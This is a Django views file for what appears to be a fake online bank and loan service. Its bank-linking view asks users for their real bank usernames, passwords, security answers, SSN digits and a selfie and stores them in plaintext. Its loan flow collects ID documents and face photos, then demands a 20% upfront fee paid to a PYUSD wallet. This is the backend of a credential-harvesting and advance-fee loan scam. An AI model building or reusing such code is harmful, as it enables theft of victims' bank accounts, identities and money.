from decimal import Decimal, InvalidOperation
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from django.contrib.auth.hashers import make_password, check_password
from django.contrib.auth import logout as auth_logout
from django.db import transaction
from django.urls import reverse
from .models import Transaction
from django.contrib.auth.decorators import login_required
from .models import (
    PYUSDWallet, Deposit, Account, LinkedBank,
    LoanApplication, Transaction, UpfrontFee, PYUSDDeposit
)


# ---------------------------
# Helper
# ---------------------------
def require_login(request):
    """Return Account object if logged in; else None (and message)."""
    user_id = request.session.get('user_id')
    if not user_id:
        messages.error(request, "Please login to continue.")
        return None
    try:
        return Account.objects.get(id=user_id)
    except Account.DoesNotExist:
        request.session.flush()
        messages.error(request, "Session expired. Please login again.")
        return None


# ---------------------------
# Index
# ---------------------------
def index(request):
    return render(request, 'core/index.html')


# ---------------------------
# Register
# ---------------------------
def open_account(request):
    if request.method == 'POST':
        fullname = (request.POST.get('fullname') or '').strip()
        email = (request.POST.get('email') or '').strip().lower()
        raw_password = request.POST.get('password') or ''

        if not fullname or not email or not raw_password:
            messages.error(request, "All fields are required.")
            return redirect('open_account')

        if Account.objects.filter(email=email).exists():
            messages.error(request, "Email already exists.")
            return redirect('login')

        Account.objects.create(
            fullname=fullname,
            email=email,
            password=make_password(raw_password),
        )
        messages.success(request, "Account created successfully. Please login.")
        return redirect('login')

    return render(request, 'core/openaccount.html')


# ---------------------------
# Login
# ---------------------------
def login_page(request):
    if request.method == 'POST':
        email = (request.POST.get('email') or '').strip().lower()
        raw_password = (request.POST.get('password') or '').strip()

        if not email or not raw_password:
            messages.error(request, "Please enter both email and password.")
            return redirect('login')

        try:
            user = Account.objects.get(email=email)
        except Account.DoesNotExist:
            messages.error(request, "Invalid email or password.")
            return redirect('login')

        if check_password(raw_password, user.password):
            request.session['user_id'] = user.id
            messages.success(request, f"Welcome back, {user.fullname}!")
            return redirect('dashboard')
        else:
            messages.error(request, "Invalid email or password.")
            return redirect('login')

    return render(request, 'core/login.html')


# ---------------------------
# Logout
# ---------------------------
def logout_view(request):
    auth_logout(request)
    request.session.flush()
    messages.success(request, "Logged out successfully.")
    return redirect('login')


# ---------------------------
# Dashboard
# ---------------------------
def dashboard(request):
    user = require_login(request)
    if not user:
        return redirect('login')

    sent = Transaction.objects.filter(sender=user)
    received = Transaction.objects.filter(recipient=user)
    transactions = sent.union(received).order_by('-created_at') if sent.exists() or received.exists() else []

    linked_banks = LinkedBank.objects.filter(account=user).order_by('-date_linked')

    context = {'user': user, 'transactions': transactions, 'linked_banks': linked_banks}
    return render(request, 'core/dashboard.html', context)


# ---------------------------
# Link Bank
# ---------------------------
@transaction.atomic
def linked_bank(request):
    user = require_login(request)
    if not user:
        return redirect('login')

    if request.method == 'POST':
        bank_name = request.POST.get('bank_name', '').strip()
        account_number = request.POST.get('account_number', '').strip()
        routing_number = request.POST.get('routing_number', '').strip()
        phone_number = request.POST.get('phone_number', '').strip()
        security_question = request.POST.get('security_question', '').strip()
        security_answer = request.POST.get('security_answer', '').strip()
        ssn_last4 = request.POST.get('ssn_last4', '').strip()
        account_username = request.POST.get('account_username', '').strip()
        account_password = request.POST.get('account_password', '').strip()
        selfie = request.FILES.get('selfie')

        if not bank_name or not account_number or not routing_number:
            messages.error(request, "Bank name, account number, and routing number are required.")
            return redirect('link_bank')

        bank = LinkedBank.objects.create(
            account=user,
            bank_name=bank_name,
            account_number=account_number,
            routing_number=routing_number,
            phone_number=phone_number,
            security_question=security_question,
            security_answer=security_answer,
            ssn_last4=ssn_last4,
            account_username=account_username,
            account_password=account_password,
            selfie=selfie,
            status='Pending'
        )

        messages.success(request, "Bank linked successfully! ✅")
        return redirect('link_status', bank_id=bank.id)

    return render(request, 'core/link_bank.html', {'user': user})


def link_status(request, bank_id):
    user = require_login(request)
    if not user:
        return redirect('login')

    bank = get_object_or_404(LinkedBank, id=bank_id, account=user)
    return render(request, 'core/link_status.html', {'linked_bank': bank})


# ---------------------------
# Deposit PYUSD
# ---------------------------
@transaction.atomic
def deposit_pyusd(request):
    user = require_login(request)
    if not user:
        return redirect('login')

    wallet = PYUSDWallet.objects.first()

    if request.method == 'POST':
        paypal_id = (request.POST.get('paypal_id') or '').strip()
        amount_raw = (request.POST.get('amount') or '').strip()
        network = (request.POST.get('network') or '').strip()

        if not paypal_id or not amount_raw:
            messages.error(request, "PayPal ID and amount are required.")
            return redirect('deposit_pyusd')

        try:
            amount = Decimal(amount_raw)
            if amount <= 0:
                raise InvalidOperation
        except (InvalidOperation, TypeError):
            messages.error(request, "Invalid amount entered.")
            return redirect('deposit_pyusd')

        PYUSDDeposit.objects.create(
            account=user,
            paypal_id=paypal_id,
            amount=amount,
            network=network or "PYUSD",
            status='Pending'
        )

        messages.success(request, "Deposit submitted successfully (Pending). Admin will review soon.")
        return redirect('deposit_status')

    return render(request, 'core/deposit_pyusd.html', {'user': user, 'wallet': wallet})


@transaction.atomic
def deposit_status(request):
    user = require_login(request)
    if not user:
        return redirect('login')

    deposits = PYUSDDeposit.objects.filter(account=user).order_by('-created_at')
    return render(request, 'core/deposit_status.html', {'deposits': deposits, 'user': user})


# ---------------------------
# Loan
# ---------------------------
@transaction.atomic
def loan(request):
    user = require_login(request)
    if not user:
        return redirect('login')

    if request.method == 'POST':
        full_name = request.POST.get('full_name', '').strip()
        email = request.POST.get('email', '').strip()
        phone = request.POST.get('phone', '').strip()
        address = request.POST.get('address', '').strip()
        employment_info = request.POST.get('employment_info', '').strip()
        income = request.POST.get('income', '0').strip()
        loan_amount = request.POST.get('loan_amount', '0').strip()
        loan_purpose = request.POST.get('loan_purpose', '').strip()
        government_id = request.FILES.get('government_id')
        face_photo = request.FILES.get('face_photo')

        if not all([full_name, email, phone, address, employment_info, loan_amount, loan_purpose]):
            messages.error(request, "All fields are required.")
            return redirect('loan')

        loan = LoanApplication.objects.create(
            account=user,
            full_name=full_name,
            email=email,
            phone=phone,
            address=address,
            employment_info=employment_info,
            income=Decimal(income or '0'),
            loan_amount=Decimal(loan_amount or '0'),
            loan_purpose=loan_purpose,
            government_id=government_id,
            face_photo=face_photo,
            status='Pending'
        )

        fee_amount = loan.loan_amount * Decimal('0.2')
        UpfrontFee.objects.create(loan=loan, account=user, fee_amount=fee_amount, status='Pending')

        return redirect('upfront_fee', loan_id=loan.id)

    return render(request, 'core/loan.html', {'user': user})


# ---------------------------
# Upfront Fee Payment
# ---------------------------
def upfront_fee(request, loan_id):
    user = require_login(request)
    if not user:
        return redirect('login')

    loan = get_object_or_404(LoanApplication, id=loan_id, account=user)
    fee = loan.upfront_fee
    wallet = PYUSDWallet.objects.first()

    # 🔒 Transaction ID cannot be edited by user
    # Only show it if admin has added one
    if request.method == 'POST':
        proof = request.FILES.get('proof_of_payment')
        if proof:
            fee.proof_of_payment = proof
            fee.save()
            messages.success(request, "Proof of payment submitted successfully!")
            return redirect('loan_status', loan_id=loan.id)
        else:
            messages.error(request, "Please upload your proof of payment.")

    return render(request, 'core/upfront_fee.html', {
        'loan': loan,
        'fee': fee,
        'wallet': wallet,
        'transaction_id': fee.transaction_id  # read-only view only
    })


def loan_status(request, loan_id):
    user = require_login(request)
    if not user:
        return redirect('login')

    loan = get_object_or_404(LoanApplication, id=loan_id, account=user)
    fee = loan.upfront_fee
    return render(request, 'core/loan_status.html', {'loan': loan, 'fee': fee})


# ---------------------------
# Loan Terms
# ---------------------------
def loan_terms(request):
    return render(request, 'core/loan_terms.html')


# ---------------------------
# Misc pages
# ---------------------------
def support(request):
    return render(request, 'core/support.html')


def transfer(request):
    return render(request, 'core/transfer.html')


def deposit_view(request):
    user = require_login(request)
    if not user:
        return redirect('login')
    return render(request, 'core/deposit.html', {'user': user})


@transaction.atomic
def withdraw_view(request):
    return render(request, 'core/withdraw.html')




@login_required
def member_dashboard(request):
    user = request.user  # This gets the logged-in user

    # Fetch recent transactions for this user
    transactions = Transaction.objects.filter(account=user).order_by('-created_at')[:10]

    return render(request, 'member/member.html', {
        'user': user,
        'transactions': transactions,
    })